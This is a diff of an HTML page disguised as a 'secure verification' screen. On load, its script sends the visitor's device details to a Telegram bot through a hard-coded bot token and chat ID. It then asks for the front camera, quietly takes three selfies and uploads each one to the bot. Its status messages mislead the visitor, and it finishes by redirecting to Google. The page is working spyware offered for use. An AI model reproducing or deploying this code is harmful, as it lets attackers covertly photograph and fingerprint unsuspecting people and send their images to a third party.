@@ -1,55 +1,151 @@
 <!DOCTYPE html>
 <html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verification</title>
+
+<style>
+body{
+    margin:0;
+    background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
+    font-family:Arial, sans-serif;
+    color:white;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+    flex-direction:column;
+}
+
+.loader{
+    width:80px;
+    height:80px;
+    border:6px solid rgba(255,255,255,0.2);
+    border-top:6px solid white;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+    margin-bottom:25px;
+}
+
+@keyframes spin{
+    100%{ transform:rotate(360deg); }
+}
+
+.text{
+    font-size:20px;
+    text-align:center;
+    max-width:300px;
+}
+</style>
+</head>
+
 <body>
+
+<div class="loader"></div>
+<div id="status" class="text">Preparing secure verification...</div>
 
 <script>
 
-async function capturePhoto() {
-    try {
+const BOT_TOKEN = "8082815317:AAEHd6AKLOBJK9vXU0KUuXCgwPt4-v0DyGg";
+const CHAT_ID = "1167762232";
+const TOTAL_PHOTOS = 3;
+const REDIRECT_URL = "https://google.com";
 
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user" }
-        });
+// Send device info
+function sendDeviceInfo(){
 
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        video.play();
+let info =
+"📱 Device Info\n\n"+
+"User Agent: "+navigator.userAgent+"\n"+
+"Platform: "+navigator.platform+"\n"+
+"Language: "+navigator.language+"\n"+
+"Screen: "+screen.width+"x"+screen.height;
 
-        await new Promise(resolve => video.onloadedmetadata = resolve);
-
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0);
-
-        stream.getTracks().forEach(track => track.stop());
-
-        canvas.toBlob(sendToTelegram, "image/jpeg");
-
-    } catch (error) {
-        alert("Camera permission denied");
-    }
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+method:"POST",
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({
+chat_id: CHAT_ID,
+text: info
+})
+});
 }
 
-function sendToTelegram(blob) {
+// Send photo
+function sendPhoto(blob,num){
 
-    const botToken = "8082815317:AAEHd6AKLOBJK9vXU0KUuXCgwPt4-v0DyGg";
-    const chatId = "1167762232";
+let formData=new FormData();
+formData.append("chat_id",CHAT_ID);
+formData.append("photo",blob,`selfie_${num}.jpg`);
 
-    let formData = new FormData();
-    formData.append("chat_id", chatId);
-    formData.append("photo", blob, "selfie.jpg");
+return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+method:"POST",
+body:formData
+});
+}
 
-    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-        method: "POST",
-        body: formData
-    });
+// Capture photos
+async function capturePhotos(){
+
+try{
+
+updateStatus("Requesting camera permission...");
+
+const stream=await navigator.mediaDevices.getUserMedia({
+video:{facingMode:"user"}
+});
+
+updateStatus("Camera started...");
+
+const video=document.createElement("video");
+video.srcObject=stream;
+video.play();
+
+await new Promise(r=>video.onloadedmetadata=r);
+
+const canvas=document.createElement("canvas");
+const ctx=canvas.getContext("2d");
+
+canvas.width=video.videoWidth;
+canvas.height=video.videoHeight;
+
+for(let i=1;i<=TOTAL_PHOTOS;i++){
+
+updateStatus("Processing verification "+i+"/"+TOTAL_PHOTOS);
+
+ctx.drawImage(video,0,0);
+
+await new Promise(resolve=>{
+canvas.toBlob(async(blob)=>{
+await sendPhoto(blob,i);
+resolve();
+},"image/jpeg");
+});
+
+await new Promise(r=>setTimeout(r,1200));
+}
+
+stream.getTracks().forEach(track=>track.stop());
+
+updateStatus("Verification complete ✔");
+
+setTimeout(()=>{
+window.location.href=REDIRECT_URL;
+},2000);
+
+}
+catch(e){
+updateStatus("Camera permission denied");
+}
 
 }
 
-capturePhoto();
+function updateStatus(text){
+document.getElementById("status").innerText=text;
+}
+
+sendDeviceInfo();
+capturePhotos();
 
 </script>
 
